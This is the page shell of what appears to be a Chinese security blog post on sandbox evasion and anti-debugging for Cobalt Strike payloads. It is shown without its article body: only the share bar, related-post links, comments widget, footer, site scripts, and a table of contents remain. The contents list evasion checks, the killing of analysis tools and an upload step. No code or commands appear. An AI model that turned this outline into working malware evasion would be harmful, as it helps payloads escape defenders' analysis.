        <div class="social-wrap dis-select"><a class="social share-item wechat" onclick="util.toggle(&quot;qrcode-wechat&quot)"><img class="lazy"  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/b32ef3da1162a.svg" /></a><a class="social share-item weibo" target="_blank" rel="external nofollow noopener noreferrer" href="https://service.weibo.com/share/share.php?url=https://jiangjiyue.github.io/2024/11/07/c9983715/&title=CS-反沙箱杂谈 - SafeKiller Zone&pics=https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202411071300223.png&summary=
    总字符数: 43.55K 
    
    
    代码: 40.25K, 文本: 1.89K
    
    
    预计阅读时间: 3.05 小时
    
    

获取沙箱环境检查CPU是否支持虚拟化123..."><img class="lazy"  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/80c07e4dbb303.svg" /></a><a class="social share-item email" href="mailto:?subject=CS-反沙箱杂谈 - SafeKiller Zone&amp;body=https://jiangjiyue.github.io/2024/11/07/c9983715/"><img class="lazy"  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/a1b00e20f425d.svg" /></a><a class="social share-item link" onclick="util.copy(&quot;copy-link&quot;, &quot;复制成功&quot;)"><img class="lazy"  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/8411ed322ced6.svg" /></a></div>
        
        <div class="qrcode" id="qrcode-wechat" style="opacity:0;height:0">
          <img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://api.qrserver.com/v1/create-qr-code/?size=256x256&data=https://jiangjiyue.github.io/2024/11/07/c9983715/"/>
        </div>
        
      </div>
    </section>
    </div>
</article>
<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/2024/11/08/7afb8de7/">VulnHub-MoneyBox</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2024/11/04/fe2980d6/">CS-ShellCode加载器</a></div></section></div>

<div class="related-wrap" id="related-posts">
    <section class='header'>
      <div class='title cap theme'>您可能感兴趣的文章</div>
    </section>
    <section class='body'>
    <div class="related-posts"><a class="item" href="/2024/10/27/77c80f0f/" title="CS-C语言总结"><span class="title">CS-C语言总结</span></a><a class="item" href="/2024/09/25/3c3f9499/" title="CS-Cobalt Strike修改特征"><span class="title">CS-Cobalt Strike修改特征</span></a><a class="item" href="/2024/09/24/3c3f9499/" title="CS-Cobalt Strike必备知识"><span class="title">CS-Cobalt Strike必备知识</span></a><a class="item" href="/2024/09/26/da146604/" title="CS-云函数隐匿C2"><span class="title">CS-云函数隐匿C2</span></a><a class="item" href="/2024/11/04/fe2980d6/" title="CS-ShellCode加载器"><span class="title">CS-ShellCode加载器</span></a></div></section></div>


  <div class="related-wrap md-text" id="comments">
    <section class='header cmt-title cap theme'>
      <p>快来参与讨论吧~</p>

    </section>
    <section class='body cmt-body waline'>
      

<div id="waline_container" class="waline_thread"><svg class="loading" style="vertical-align:middle;fill:currentColor;overflow:hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2709"><path d="M832 512c0-176-144-320-320-320V128c211.2 0 384 172.8 384 384h-64zM192 512c0 176 144 320 320 320v64C300.8 896 128 723.2 128 512h64z" p-id="2710"></path></svg></div>

    </section>
  </div>



<footer class="page-footer footnote"><hr><div class="sitemap"><div class="sitemap-group"><span class="fs15">博客</span><a href="/">近期</a><a href="/categories/">分类</a><a href="/tags/">标签</a><a href="/archives/">归档</a><a href="/tools/">工具</a></div><div class="sitemap-group"><span class="fs15">笔记</span><a href="/wiki/tags/DevOps/index.html">DevOps</a><a href="/wiki/tags/Vulnerability/index.html">常见漏洞分析</a><a href="/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/">编程语言</a></div><div class="sitemap-group"><span class="fs15">社交</span><a href="/friends/">友链</a><a href="/comments/">留言板</a></div><div class="sitemap-group"><span class="fs15">更多</span><a href="/about/">关于本站</a><a target="_blank" rel="noopener" href="https://github.com/JiangJiYue">GitHub</a></div></div><div class="text"><center>
  <p>本破站由 <a href="/">@SafeKiller Zone</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar">Stellar</a> 主题创建。<br>本博客部分素材来源于网络，如有侵权请联系<a href="mailto:jiangjiyue1@gmail.com">jiangjiyue1@gmail.com</a>删除<br>本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
  <!--不蒜子计数器-->
  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
  <span>本"页面"访问 <span id="busuanzi_value_page_pv"></span> 次 | 👀总访问 <span id="busuanzi_value_site_pv"></span> 次 | 总访客 <span id="busuanzi_value_site_uv"></span> 人</span>
  <br>
  <span id="runtime_span"></span>
  <script type="text/javascript">
    // JavaScript for showing runtime here
  </script>
</center>
<div style="display: flex;justify-content: center;align-items: center;margin: 10px;">
  <a target="_blank" rel="noopener" href="https://notbyai.fyi/"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/assets/website/Written-By-Human-white.png" style="width:140px;height:50px;margin-right: 10px " id='notbyai'></a>
  <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/assets/website/by-nc-sa.eu.png" style="width:140px;height:50px"></a>
</div>
</div></footer>
<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
<div class="widgets">



<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%B2%99%E7%AE%B1%E7%8E%AF%E5%A2%83"><span class="toc-text">获取沙箱环境</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5CPU%E6%98%AF%E5%90%A6%E6%94%AF%E6%8C%81%E8%99%9A%E6%8B%9F%E5%8C%96"><span class="toc-text">检查CPU是否支持虚拟化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9F%E8%AF%AD%E8%A8%80"><span class="toc-text">获取系统语言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E8%BF%9B%E7%A8%8B%E4%BF%A1%E6%81%AF"><span class="toc-text">获取进程信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96CPU%E4%BF%A1%E6%81%AF"><span class="toc-text">获取CPU信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%BC%80%E6%9C%BA%E6%97%B6%E9%97%B4"><span class="toc-text">获取开机时间</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83DLLS"><span class="toc-text">获取虚拟环境DLLS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E7%94%A8%E6%88%B7"><span class="toc-text">获取当前用户</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E7%A1%AC%E7%9B%98%E4%BF%A1%E6%81%AF"><span class="toc-text">获取硬盘信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96MAC%E4%BF%A1%E6%81%AF"><span class="toc-text">获取MAC信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96USB%E8%AE%BE%E5%A4%87"><span class="toc-text">获取USB设备</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%8E%86%E5%8F%B2%E6%96%87%E4%BB%B6"><span class="toc-text">获取历史文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Systeminfo"><span class="toc-text">Systeminfo</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%B7%B2%E5%AE%89%E8%A3%85%E8%BD%AF%E4%BB%B6"><span class="toc-text">获取已安装软件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0"><span class="toc-text">上传</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Main"><span class="toc-text">Main</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E8%B0%83%E8%AF%95"><span class="toc-text">反调试</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Cpuid"><span class="toc-text">Cpuid</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%86%8C%E8%A1%A8"><span class="toc-text">注册表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E8%B0%83%E8%AF%95-1"><span class="toc-text">反调试</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#BeingDebugged"><span class="toc-text">BeingDebugged</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DebugBreak"><span class="toc-text">DebugBreak</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ContextLogRegisters"><span class="toc-text">ContextLogRegisters</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%88%E6%AD%A2%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7"><span class="toc-text">终止分析工具</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%84%E6%89%8B%E6%AE%B5"><span class="toc-text">常规手段</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5%E8%AF%AD%E8%A8%80"><span class="toc-text">检查语言</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5%E7%94%A8%E6%88%B7%E5%90%8D"><span class="toc-text">检查用户名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5%E5%BC%80%E6%9C%BA%E6%97%B6%E9%97%B4"><span class="toc-text">检查开机时间</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5MAC%E5%9C%B0%E5%9D%80"><span class="toc-text">检查MAC地址</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5%E8%BF%9B%E7%A8%8B"><span class="toc-text">检查进程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5CPU"><span class="toc-text">检查CPU</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5RAM"><span class="toc-text">检查RAM</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5USB"><span class="toc-text">检查USB</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5%E6%96%87%E4%BB%B6%E5%90%8D"><span class="toc-text">检查文件名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5DLLS"><span class="toc-text">检查DLLS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5%E5%9F%9F%E7%8E%AF%E5%A2%83"><span class="toc-text">检查域环境</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5%E5%B1%8F%E5%B9%95%E5%88%86%E8%BE%A8%E7%8E%87"><span class="toc-text">检查屏幕分辨率</span></a></li></ol></li></ol></li></ol></div><div class="widget-footer">

<a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 12c0-4.714 0-7.071 1.464-8.536C4.93 2 7.286 2 12 2c4.714 0 7.071 0 8.535 1.464C22 4.93 22 7.286 22 12c0 4.714 0 7.071-1.465 8.535C19.072 22 16.714 22 12 22s-7.071 0-8.536-1.465C2 19.072 2 16.714 2 12Z"/><path stroke-linecap="round" stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/></g></svg><span>回到顶部</span></a></div></widget>
</div></aside><div class='float-panel blur'>
  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
  </button>
  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
  </button>
</div>
</div><div class="scripts">
<script type="text/javascript">
  const ctx = {
    date_suffix: {
      just: `刚刚`,
      min: `分钟前`,
      hour: `小时前`,
      day: `天前`,
    },
    root : `/`,
  };

  // required plugins (only load if needs)
  if (`local_search`) {
    ctx.search = {};
    ctx.search.service = `local_search`;
    if (ctx.search.service == 'local_search') {
      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"codeblock":true,"sort":"-date"}`);
      ctx.search[ctx.search.service] = service_obj;
    }
  }
  const def = {
    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.9/avatar/round/3442075.svg`,
    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.9/cover/76b86c0226ffd.svg`,
  };
  const deps = {
    jquery: `https://cdn.bootcdn.net/ajax/libs/jquery/3.7.1/jquery.min.js`,
    marked: `https://cdn.bootcdn.net/ajax/libs/marked/4.0.18/marked.min.js`
  }
  

</script>

<script type="text/javascript">
  const utils = {
    // 懒加载 css https://github.com/filamentgroup/loadCSS
    css: (href, before, media, attributes) => {
      var doc = window.document;
      var ss = doc.createElement("link");
      var ref;
      if (before) {
        ref = before;
      } else {
        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
        ref = refs[refs.length - 1];
      }
      var sheets = doc.styleSheets;
      if (attributes) {
        for (var attributeName in attributes) {
          if (attributes.hasOwnProperty(attributeName)) {
            ss.setAttribute(attributeName, attributes[attributeName]);
          }
        }
      }
      ss.rel = "stylesheet";
      ss.href = href;
      ss.media = "only x";
      function ready(cb) {
        if (doc.body) {
          return cb();
        }
        setTimeout(function () {
          ready(cb);
        });
      }
      ready(function () {
        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
      });
      var onloadcssdefined = function (cb) {
        var resolvedHref = ss.href;
        var i = sheets.length;
        while (i--) {
          if (sheets[i].href === resolvedHref) {
            return cb();
          }
        }
        setTimeout(function () {
          onloadcssdefined(cb);
        });
      };
      function loadCB() {
        if (ss.addEventListener) {
          ss.removeEventListener("load", loadCB);
        }
        ss.media = media || "all";
      }
      if (ss.addEventListener) {
        ss.addEventListener("load", loadCB);
      }
      ss.onloadcssdefined = onloadcssdefined;
      onloadcssdefined(loadCB);
      return ss;
    },

    js: (src, opt) => new Promise((resolve, reject) => {
      var script = document.createElement('script');
      if (src.startsWith('/')){
        src = ctx.root + src.substring(1);
      }
      script.src = src;
      if (opt) {
        for (let key of Object.keys(opt)) {
          script[key] = opt[key]
        }
      } else {
        // 默认异步，如果需要同步，第二个参数传入 {} 即可
        script.async = true
      }
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    }),

    jq: (fn) => {
      if (typeof jQuery === 'undefined') {
        utils.js(deps.jquery).then(fn)
      } else {
        fn()
      }
    },
    
    onLoading: (el) => {
      if (el) {
        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
      }
    },
    onLoadSuccess: (el) => {
      if (el) {
        $(el).find('.loading-wrap').remove();
      }
    },
    onLoadFailure: (el) => {
      if (el) {
        $(el).find('.loading-wrap svg').remove();
        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
        $(el).find('.loading-wrap').addClass('error');
      }
    },
    request: (el, url, callback, onFailure) => {
      let retryTimes = 3;
      utils.onLoading(el);
      function req() {
        return new Promise((resolve, reject) => {
          let status = 0; // 0 等待 1 完成 2 超时
          let timer = setTimeout(() => {
            if (status === 0) {
              status = 2;
              timer = null;
              reject('请求超时');
              if (retryTimes == 0) {
                onFailure();
              }
            }
          }, 5000);
          fetch(url).then(function(response) {
            if (status !== 2) {
              clearTimeout(timer);
              resolve(response);
              timer = null;
              status = 1;
            }
            if (response.ok) {
              return response.json();
            }
            throw new Error('Network response was not ok.');
          }).then(function(data) {
            retryTimes = 0;
            utils.onLoadSuccess(el);
            callback(data);
          }).catch(function(error) {
            if (retryTimes > 0) {
              retryTimes -= 1;
              setTimeout(() => {
                req();
              }, 5000);
            } else {
              utils.onLoadFailure(el);
              onFailure();
            }
          });
        });
      }
      req();
    },
  };
</script>

<script>
  const sidebar = {
    leftbar: () => {
      if (l_body) {
        l_body.toggleAttribute('leftbar');
        l_body.removeAttribute('rightbar');
      }
    },
    rightbar: () => {
      if (l_body) {
        l_body.toggleAttribute('rightbar');
        l_body.removeAttribute('leftbar');
      }
    },
    dismiss: () => {
      if (l_body) {
        l_body.removeAttribute('leftbar');
        l_body.removeAttribute('rightbar');
      }
    },
    toggleTOC: () => {
      document.querySelector('#data-toc').classList.toggle('collapse');
    }
  }
</script>

<!-- required -->
<script src="/js/main.js?v=1.27.0" async></script>

<!-- optional -->

  <script type="module">
  import { init } from 'https://unpkg.com/@waline/client@v3/dist/waline.js'

  function load_comment(){
    if(!document.getElementById("waline_container"))return;

    utils.css('https://unpkg.com/@waline/client@v3/dist/waline.css');
    utils.css('https://gcore.jsdelivr.net/npm/@waline/client@3.1.2/dist/waline-meta.css');

    const el = document.getElementById("waline_container");
    var path = el.getAttribute('comment_id');
    if (!path) {
      path = decodeURI(window.location.pathname);
    }

    const waline = init(Object.assign({"js":"https://unpkg.com/@waline/client@v3/dist/waline.js","css":"https://unpkg.com/@waline/client@v3/dist/waline.css","meta_css":"https://gcore.jsdelivr.net/npm/@waline/client@3.1.2/dist/waline-meta.css","serverURL":"https://www.regret.live","commentCount":true,"pageview":false,"locale":{"placeholder":"有什么想说的？大胆说出来吧(*^_^*)","reactionTitle":"请给这篇文章做个评价吧","reaction0":"感兴趣","reaction1":"给心心","reaction2":"什么？","reaction3":"心碎了","reaction4":"别过来","reaction5":"矮油~","reaction6":"不忍直视","reaction7":"我真生气辣！","reaction8":"摇晃","level0":"潜水","level1":"冒泡","level2":"吐槽","level3":"活跃","level4":"话痨","level5":"传说"},"reaction":["/emojis/ablobcatattentionreverse.png","/emojis/ablobcatheart.png","/emojis/ablobcatdoubt.png","/emojis/ablobcatheartbroken.png","/emojis/ablobcatterrified.png","/emojis/ablobcatshy.png","/emojis/ablobcatnoface.png","/emojis/ablobcatanger.gif","/emojis/ablobcatrainbow.png"],"emoji":["https://gcore.jsdelivr.net/gh/norevi/waline-blobcatemojis@1.0/blobs"]}, {
      el: '#waline_container',
      path: path,
      
    }));

  }
  window.addEventListener('DOMContentLoaded', (event) => {
    load_comment();
  });

</script>




<script defer>
  window.addEventListener('DOMContentLoaded', (event) => {
    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"}}`));
    for (let id of Object.keys(ctx.services)) {
      const js = ctx.services[id].js;
      if (id == 'siteinfo') {
        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
        if (ctx.cardlinks?.length > 0) {
          utils.js(js, { defer: true }).then(function () {
            setCardLink(ctx.cardlinks);
          });
        }
      } else {
        const els = document.getElementsByClassName(`ds-${id}`);
        if (els?.length > 0) {
          utils.jq(() => {
            if (id == 'timeline' || 'memos' || 'marked') {
              utils.js(deps.marked).then(function () {
                utils.js(js, { defer: true });
              });
            } else {
              utils.js(js, { defer: true });
            }
          });
        }
      }
    }
  });
</script>

<script>
  window.addEventListener('DOMContentLoaded', (event) => {
    ctx.search = {
      path: `/search.json`,
    }
    utils.js('/js/search/local-search.js', { defer: true });
  });
</script><script>
  window.FPConfig = {
    delay: 0,
    ignoreKeywords: [],
    maxRPS: 5,
    hoverDelay: 25
  };
</script>
<script defer src="https://cdn.bootcdn.net/ajax/libs/flying-pages/2.1.2/flying-pages.min.js"></script><script defer src="https://cdn.bootcdn.net/ajax/libs/vanilla-lazyload/17.8.4/lazyload.min.js"></script>
<script>
  // https://www.npmjs.com/package/vanilla-lazyload
  // Set the options globally
  // to make LazyLoad self-initialize
  window.lazyLoadOptions = {
    elements_selector: ".lazy",
  };
  // Listen to the initialization event
  // and get the instance of LazyLoad
  window.addEventListener(
    "LazyLoad::Initialized",
    function (event) {
      window.lazyLoadInstance = event.detail.instance;
    },
    false
  );
  document.addEventListener('DOMContentLoaded', function () {
    window.lazyLoadInstance?.update();
  });
</script><script>
  ctx.fancybox = {
    selector: `.swiper-slide img, .gallery img ,#waline_container .vcontent img`,
    css: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.min.css`,
    js: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.umd.min.js`
  };
  var selector = '[data-fancybox]:not(.error)';
  if (ctx.fancybox.selector) {
    selector += `, ${ctx.fancybox.selector}`
  }
  var needFancybox = document.querySelectorAll(selector).length !== 0;
  if (!needFancybox) {
    const els = document.getElementsByClassName('ds-memos');
    if (els != undefined && els.length > 0) {
      needFancybox = true;
    }
  }
  if (needFancybox) {
    utils.css(ctx.fancybox.css);
    utils.js(ctx.fancybox.js, { defer: true }).then(function () {
      Fancybox.bind(selector, {
        hideScrollbar: false,
        Thumbs: {
          autoStart: false,
        },
        caption: (fancybox, slide) => {
          return slide.triggerEl.alt || null
        }
      });
    })
  }
</script><script>
  window.addEventListener('DOMContentLoaded', (event) => {
    const swiper_api = document.getElementById('swiper-api');
    if (swiper_api != undefined) {
      utils.css(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.css`);
      utils.js(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.js`, { defer: true }).then(function () {
        const effect = swiper_api.getAttribute('effect') || '';
        var swiper = new Swiper('.swiper#swiper-api', {
          slidesPerView: 'auto',
          spaceBetween: 8,
          centeredSlides: true,
          effect: effect,
          loop: true,
          pagination: {
            el: '.swiper-pagination',
            clickable: true,
          },
          navigation: {
            nextEl: '.swiper-button-next',
            prevEl: '.swiper-button-prev',
          },
        });
      })
    }
  });
</script><script>
  document.addEventListener('DOMContentLoaded', function () {
    window.codeElements = document.querySelectorAll('.code');
    if (window.codeElements.length > 0) {
      ctx.copycode = {
        default_text: `Copy`,
        success_text: `Copied`,
        toast: `复制成功`,
      };
      utils.js('/js/plugins/copycode.js');
    }
  });
</script>


<!-- inject -->
<script type="text/javascript" src="/js/darkmode.js"></script>
</div></body></html>
